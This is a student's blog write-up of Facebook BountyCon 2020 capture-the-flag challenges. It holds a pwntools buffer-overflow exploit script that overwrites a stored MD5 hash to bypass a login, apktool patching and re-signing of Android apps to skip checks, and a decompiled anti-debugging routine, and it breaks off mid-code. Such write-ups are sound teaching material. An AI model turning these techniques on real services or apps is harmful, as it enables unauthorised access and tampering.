<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Facebook BountyCon 2020 Write-up | Waseem Ullah Siddiqui</title>
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="Facebook BountyCon 2020 Write-up" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="This year Facebook/Google hosted BountyCon Capture the Flag competition. I participated in it and solved 15 of 17 challenges (except Proof of game and aglet). As I’m currently an undergraduate student and in the learning stage, my solutions will not be optimal. Although I didn’t get selected as a winner, still it was pretty fun and engaging to solve all of these challenges." />
<meta property="og:description" content="This year Facebook/Google hosted BountyCon Capture the Flag competition. I participated in it and solved 15 of 17 challenges (except Proof of game and aglet). As I’m currently an undergraduate student and in the learning stage, my solutions will not be optimal. Although I didn’t get selected as a winner, still it was pretty fun and engaging to solve all of these challenges." />
<link rel="canonical" href="http://localhost:4000/blog/2020/03/03/BountyCon-2020.html" />
<meta property="og:url" content="http://localhost:4000/blog/2020/03/03/BountyCon-2020.html" />
<meta property="og:site_name" content="Waseem Ullah Siddiqui" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-03-03T21:44:46-08:00" />
<script type="application/ld+json">
{"datePublished":"2020-03-03T21:44:46-08:00","@type":"BlogPosting","dateModified":"2020-03-03T21:44:46-08:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2020/03/03/BountyCon-2020.html"},"url":"http://localhost:4000/blog/2020/03/03/BountyCon-2020.html","description":"This year Facebook/Google hosted BountyCon Capture the Flag competition. I participated in it and solved 15 of 17 challenges (except Proof of game and aglet). As I’m currently an undergraduate student and in the learning stage, my solutions will not be optimal. Although I didn’t get selected as a winner, still it was pretty fun and engaging to solve all of these challenges.","headline":"Facebook BountyCon 2020 Write-up","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Waseem Ullah Siddiqui" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">Home</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"></div>
      </nav></div>
  <meta name="robots" content="noarchive">
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Facebook BountyCon 2020 Write-up</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2020-03-03T21:44:46-08:00" itemprop="datePublished">Mar 3, 2020
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>This year Facebook/Google hosted BountyCon Capture the Flag competition. I participated in it and solved 15 of 17 challenges (except Proof of game and aglet). As I’m currently an undergraduate student and in the learning stage, my solutions will not be optimal. Although I didn’t get selected as a winner, still it was pretty fun and engaging to solve all of these challenges.</p>

<p>Before coming to the right solution to the challenges. I tried a lot of different ways to solve the challenges. Below are the solutions that I used to solve the challenges.</p>
<h1 id="secure-login">Secure Login</h1>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We developed a super secure login system, but unfortunately, we aren't familiar with those newfangled memory-safe languages.

nc ec2-3-11-37-224.eu-west-2.compute.amazonaws.com 10000

secure_login.tar.gz
</code></pre></div></div>

<p><a href="/files/secure_login.tar.gz">Link to the file</a></p>

<p>Starting from the first challange which had a description stated above.
As server <code class="highlighter-rouge">ec2-3-11-37-224.eu-west-2.compute.amazonaws.com</code> is listening, we have to connect it using <code class="highlighter-rouge">nc ec2-3-11-37-224.eu-west-2.compute.amazonaws.com 10000</code> command. On connecting, it prompts for the password which we don’t know and somehow, we have to bypass it to get the flag.</p>

<p>The file which was running on their server was given to us. So, I quickly ran that file on my local machine and connected to it using “nc localhost 10000”, and again it prompted for the password.
I started debugging it using Ghidra (a free and open-source reverse engineering tool developed by the National Security Agency). After opening the file with Ghidra and decompiling ASM to C code, there was a function <code class="highlighter-rouge">check_passwd</code> which was responsible for the password validation.
The function looked something like this:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">check_passwd</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="kt">ssize_t</span> <span class="n">sVar2</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_b8</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_b0</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_a8</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_a0</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_98</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_90</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_88</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_80</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_78</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_70</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_68</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_60</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_58</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_50</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_48</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_40</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_38</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
  <span class="n">uchar</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">24</span><span class="p">];</span>
  <span class="n">undefined8</span> <span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">local_b8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_b0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_a8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_a0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_98</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_90</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_88</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_80</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_78</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_70</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_68</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_60</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_58</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_50</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_48</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_40</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_38</span> <span class="o">=</span> <span class="mh">0xa99dd1dbed586201</span><span class="p">;</span>
  <span class="n">local_30</span> <span class="o">=</span> <span class="mh">0xc6bbb0b969f29e4d</span><span class="p">;</span>
  <span class="n">write</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">"Password: "</span><span class="p">,</span><span class="mh">0xb</span><span class="p">);</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="n">sVar2</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_b8</span><span class="p">,</span><span class="mh">0x90</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar2</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">MD5</span><span class="p">((</span><span class="n">uchar</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_b8</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="n">local_28</span><span class="p">);</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">local_28</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">write</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">"BountyCon{XXXXXXXXXXXXXXXXXXXXXXXXXXX}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mh">0x28</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>
<p>The line <code class="highlighter-rouge">sVar2 = read(param_1,&amp;local_b8,0x90);</code> is reading 144 characters from the user and saving it to local_b8.
Line <code class="highlighter-rouge">MD5((uchar *)&amp;local_b8,0x80,local_28);</code> doing MD5 of 128 characters taken from user and saving to local_28.
Line <code class="highlighter-rouge">iVar1 = memcmp(local_28,&amp;local_38,0x10);</code>  comparing 0x10(16 in decimal) bytes of two blocks local_28 and local_38(as local_38 is of only 8 bytes, the value of local_30 will also be compared) of memory. Both local_38 and local_30 are defined in the code with precomputed MD5. 
If the comparison is true it will print the flag. As MD5 is a one-way function, it is difficult to know the input.</p>

<p>As local_b8 is of 8 bytes, BufferOverflow will happen when users write password of 144 characters and it will overwrite all the  variables till local_30 variable.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>undefined8 local_b8;
undefined8 local_b0;
undefined8 local_a8;
undefined8 local_a0;
undefined8 local_98;
undefined8 local_90;
undefined8 local_88;
undefined8 local_80;
undefined8 local_78;
undefined8 local_70;
undefined8 local_68;
undefined8 local_60;
undefined8 local_58;
undefined8 local_50;
undefined8 local_48;
undefined8 local_40;
undefined8 local_38;
undefined8 local_30;
</code></pre></div></div>
<p>This means that we can control local_38 and local_30.
Now, the Solution is pretty straight forward. Enter some garbage data of 128 characters + MD5 hash of it. So,128 + 16(MD5 hash) = 144. The program will compute the MD5 hash of the first 128 characters and will compare it with the next 16 characters(local_38 and local_30) which were overwritten by us.</p>

<p>Below is the script that i used.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'ec2-3-11-37-224.eu-west-2.compute.amazonaws.com'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Password: '</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">128</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">offset</span>
<span class="c1">#############MD5 Payload###############
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xaf\x35\xb0\xd3\x48\xe5\x16\x20\x36\xe1\x83\x33\x9d\x38\x5b\x0c</span><span class="s">"</span><span class="c1"># MD5 hash of ("A"*128)
</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Sending payload...: {}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'BountyCon'</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Here</span><span class="se">\'</span><span class="s">s your flag :)'</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Flag: BountyCon{}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()))</span>
<span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="/images/Screenshot_3.png" alt="" class="img-responsive" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="shake-it">Shake It</h1>

<p>The second challenge as named “Shake It” quoting:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The best way to get fit - just shake it!


shake_it.tar.gz
</code></pre></div></div>

<p><a href="/files/shake_it.tar.gz">Link to the file</a></p>

<p>After extracting the file, there was an apk file in it. I quickly installed that apk file to my mobile and a screen like below opened.</p>

<p><img src="/images/Screenshot_1.png" alt="" class="img-responsive" /></p>

<p>It said <code class="highlighter-rouge">Start shaking</code>
so when I shook it, the text changed to <code class="highlighter-rouge">999999 Shakes to go</code> which meant we have to shake it <code class="highlighter-rouge">999999</code> times to get the flag. Since this number is too huge, we have to patch the apk file. Here, I decompiled the apk file using <code class="highlighter-rouge">Jadx</code> to view the java code. The flag wasn’t in the apk file, it was stored in an encrypted form in the <code class="highlighter-rouge">native-lib.so</code> file.
In the mainactivity class, I found the following code:</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onSensorChanged</span><span class="o">(</span><span class="nc">SensorEvent</span> <span class="n">sensorEvent</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">sensorEvent</span><span class="o">.</span><span class="na">sensor</span><span class="o">.</span><span class="na">getType</span><span class="o">()</span> <span class="o">==</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
            <span class="kt">float</span> <span class="n">f</span> <span class="o">=</span> <span class="n">sensorEvent</span><span class="o">.</span><span class="na">values</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
            <span class="kt">float</span> <span class="n">f2</span> <span class="o">=</span> <span class="n">sensorEvent</span><span class="o">.</span><span class="na">values</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span>
            <span class="kt">float</span> <span class="n">f3</span> <span class="o">=</span> <span class="n">sensorEvent</span><span class="o">.</span><span class="na">values</span><span class="o">[</span><span class="mi">2</span><span class="o">];</span>
            <span class="kt">long</span> <span class="n">currentTimeMillis</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>
            <span class="kt">long</span> <span class="n">j</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">lastTime</span><span class="o">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">currentTimeMillis</span> <span class="o">-</span> <span class="n">j</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="o">)</span> <span class="o">{</span>
                <span class="kt">long</span> <span class="n">j2</span> <span class="o">=</span> <span class="n">currentTimeMillis</span> <span class="o">-</span> <span class="n">j</span><span class="o">;</span>
                <span class="k">this</span><span class="o">.</span><span class="na">lastTime</span> <span class="o">=</span> <span class="n">currentTimeMillis</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">((</span><span class="nc">Math</span><span class="o">.</span><span class="na">abs</span><span class="o">(((((</span><span class="n">f</span> <span class="o">+</span> <span class="n">f2</span><span class="o">)</span> <span class="o">+</span> <span class="n">f3</span><span class="o">)</span> <span class="o">-</span> <span class="k">this</span><span class="o">.</span><span class="na">lastX</span><span class="o">)</span> <span class="o">-</span> <span class="k">this</span><span class="o">.</span><span class="na">lastY</span><span class="o">)</span> <span class="o">-</span> <span class="k">this</span><span class="o">.</span><span class="na">lastZ</span><span class="o">)</span> <span class="o">/</span> <span class="o">((</span><span class="kt">float</span><span class="o">)</span> <span class="n">j2</span><span class="o">))</span> <span class="o">*</span> <span class="mf">10000.0f</span> <span class="o">&gt;</span> <span class="mf">350.0f</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">this</span><span class="o">.</span><span class="na">shakes</span><span class="o">++;</span>
                    <span class="nc">TextView</span> <span class="n">textView</span> <span class="o">=</span> <span class="o">(</span><span class="nc">TextView</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="no">C0272R</span><span class="o">.</span><span class="na">C0274id</span><span class="o">.</span><span class="na">result_text</span><span class="o">);</span>
                    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">shakes</span> <span class="o">&lt;</span> <span class="mi">10000000</span><span class="o">)</span> <span class="o">{</span>
                        <span class="nc">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
                        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="nc">BuildConfig</span><span class="o">.</span><span class="na">FLAVOR</span><span class="o">);</span>
                        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="mi">10000000</span> <span class="o">-</span> <span class="k">this</span><span class="o">.</span><span class="na">shakes</span><span class="o">);</span>
                        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" shakes to go!"</span><span class="o">);</span>
                        <span class="n">textView</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                        <span class="nc">StringBuilder</span> <span class="n">sb2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
                        <span class="n">sb2</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"BountyCon{"</span><span class="o">);</span>
                        <span class="n">sb2</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">stringFromJNI</span><span class="o">());</span>
                        <span class="n">sb2</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"}"</span><span class="o">);</span>
                        <span class="n">textView</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="n">sb2</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
                    <span class="o">}</span>
                <span class="o">}</span>
                <span class="k">this</span><span class="o">.</span><span class="na">lastX</span> <span class="o">=</span> <span class="n">f</span><span class="o">;</span>
                <span class="k">this</span><span class="o">.</span><span class="na">lastY</span> <span class="o">=</span> <span class="n">f2</span><span class="o">;</span>
                <span class="k">this</span><span class="o">.</span><span class="na">lastZ</span> <span class="o">=</span> <span class="n">f3</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>
<p>If we change the <code class="highlighter-rouge">if</code> condition in <code class="highlighter-rouge">if (this.shakes &lt; 10000000)</code> then we can have our flag. For this, I used apktool to patch the file.
I decompiled file using apktool <code class="highlighter-rouge">apktool -d "shake_it.apk</code> and in the <code class="highlighter-rouge">shake_it/smali/com/example/myapplication/MainActivity.smali</code>, I changed the if condition by changing <code class="highlighter-rouge">if-gez v7, :cond_0</code> to <code class="highlighter-rouge">if-lez v7, :cond_0</code></p>

<p><img src="/images/Screenshot_2.png" alt="" class="img-responsive" /></p>

<p><img src="/images/Untitled.png" alt="" class="img-responsive" /></p>

<p>Build the apk file again using <code class="highlighter-rouge">apktool b "shake_it" -o "shake_it1.apk"</code>.If you install a newly created apk file you will get a certificate error. So we have to sign the apk file. For this, create a key using keytool <code class="highlighter-rouge">keytool -v -genkey -keystore shake_it1.keystore -alias shake_it1 -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 356</code>. Enter anything in the fields.</p>

<p><img src="/images/Screenshot_34.png" alt="" class="img-responsive" /></p>

<p>then, sign the application using jarsigner <code class="highlighter-rouge">jarsigner -keystore shake_it1.keystore -sigalg SHA1withRSA -digestalg SHA1 shake_it1.apk shake_it1</code></p>

<p><img src="/images/Screenshot_35.png" alt="" class="img-responsive" /></p>

<p>Install the apk file and shake it, you will have your flag.</p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="lighthouse">Lighthouse</h1>

<p>Moving on to challenge number 3 called lighthouse.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Who needs a lighthouse when we have phones?

Note: ensure you grant the app camera permissions.

lighthouse.tar.gz
</code></pre></div></div>

<p><a href="/files/lighthouse.tar.gz">Link to the file</a></p>

<p>After extracting the file, there was an apk file in it. On installing that apk file to my mobile there was a screen with a single button. When I pressed the button flash started to turn on and off.</p>

<p>I decompiled the apk file using <code class="highlighter-rouge">Jadx</code> to view the java code.
From the code what I understood was that the code was containing the morse codes map to alpha codes. On each character of morse code (“.”, “-“ , “ “) flash will be turned off or on for some time defined in the code, and from the flash, you have to get the morse code and from the morse code you have to get the alpha character which will make the flag, but the flash was turning off and on too quickly that a human can’t handle it.</p>

<p>After analyzing a bit further I realized that the flag was encrypted in the same form and in the same file(libnative-lib.so) as in “Shake It” challenge. So, I replaced the “libnative-lib.so” of lighthouse to shake it “libnative-lib.so” file, then an installed apk file and shake it to get the file.</p>

<p>I decompiled file using apktool <code class="highlighter-rouge">apktool -d "shake_it.apk</code> and <code class="highlighter-rouge">apktool -d "lighthouse.apk</code>. In the <code class="highlighter-rouge">shake_it/lib/</code> replace all the files/folders including <code class="highlighter-rouge">libnative-lib.so</code> with <code class="highlighter-rouge">lighthouse/lib/</code> files of lighthouse(just simply copy all folder of <code class="highlighter-rouge">lighthouse/lib/</code> and paste them to <code class="highlighter-rouge">shake_it/lib/</code>).</p>

<p>Build the apk file again using <code class="highlighter-rouge">apktool b "shake_it" -o "shake_it1.apk"</code>.If you install a newly created apk file you will get a certificate error. Hence, sign the apk file. For this run; first, create a key using keytool <code class="highlighter-rouge">keytool -v -genkey -keystore shake_it1.keystore -alias shake_it1 -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 356</code>. Enter anything in the fields.</p>

<p><img src="/images/Screenshot_34.png" alt="" class="img-responsive" /></p>

<p>then, sign the application using jarsigner <code class="highlighter-rouge">jarsigner -keystore shake_it1.keystore -sigalg SHA1withRSA -digestalg SHA1 shake_it1.apk shake_it1</code></p>

<p><img src="/images/Screenshot_35.png" alt="" class="img-responsive" /></p>

<p>Install the apk file and shake it you will have your flag.</p>

<p>Here, I was not sure if it was the intended solution.</p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="anti-what">Anti What</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>What do you mean a debugger is already attached?


anti_what.tar.gz
</code></pre></div></div>

<p><a href="/files/anti_what.tar.gz">Link to the file</a></p>

<p>Running the file will print <code class="highlighter-rouge">Press any key to quit</code>
I used Ghidra to decompile the file. After opening the file with Ghidra and decompiling ASM to C code. Main Function looked something like this</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">param_2</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">lVar2</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="n">extraout_var</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">uVar3</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">local_15c</span><span class="p">;</span>
  <span class="n">termios</span> <span class="n">local_158</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_118</span> <span class="p">[</span><span class="mi">264</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">local_15c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">lVar2</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">lVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">local_15c</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">lVar2</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">lVar2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">local_15c</span> <span class="o">=</span> <span class="n">local_15c</span> <span class="o">*</span> <span class="mi">3</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_15c</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">RC4_set_key</span><span class="p">((</span><span class="n">RC4_KEY</span> <span class="o">*</span><span class="p">)</span><span class="n">local_118</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="n">key</span><span class="p">);</span>
    <span class="n">RC4</span><span class="p">((</span><span class="n">RC4_KEY</span> <span class="o">*</span><span class="p">)</span><span class="n">local_118</span><span class="p">,</span><span class="mh">0x4e</span><span class="p">,</span><span class="n">ptext</span><span class="p">,</span><span class="n">ptext</span><span class="p">);</span>
    <span class="n">runPayload</span><span class="p">();</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Press any key to quit..."</span><span class="p">);</span>
    <span class="n">tcgetattr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_158</span><span class="p">);</span>
    <span class="n">local_158</span><span class="p">.</span><span class="n">c_lflag</span> <span class="o">=</span> <span class="n">local_158</span><span class="p">.</span><span class="n">c_lflag</span> <span class="o">&amp;</span> <span class="mh">0xfffffffd</span><span class="p">;</span>
    <span class="n">local_158</span><span class="p">.</span><span class="n">c_cc</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\x01'</span><span class="p">;</span>
    <span class="n">local_158</span><span class="p">.</span><span class="n">c_cc</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
    <span class="n">tcsetattr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_158</span><span class="p">);</span>
    <span class="n">getchar</span><span class="p">();</span>
    <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">unlink</span><span class="p">(</span><span class="o">*</span><span class="n">param_2</span><span class="p">);</span>
    <span class="n">uVar3</span> <span class="o">=</span> <span class="n">CONCAT44</span><span class="p">(</span><span class="n">extraout_var</span><span class="p">,</span><span class="n">iVar1</span><span class="p">);</span>
  <span class="p">}</span>
